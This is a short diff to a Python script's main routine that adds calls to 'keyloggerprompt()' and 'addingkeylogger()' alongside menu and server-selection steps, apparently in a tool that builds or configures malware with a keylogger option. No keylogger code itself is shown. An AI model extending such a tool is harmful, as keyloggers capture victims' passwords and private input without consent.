@@ -25,6 +25,9 @@ if __name__ == "__main__":
     try:
         runMainMenu()
 
+        keyloggerprompt()
+        addingkeylogger()
+       
         inputCustom()
         ##############
         selectServer()
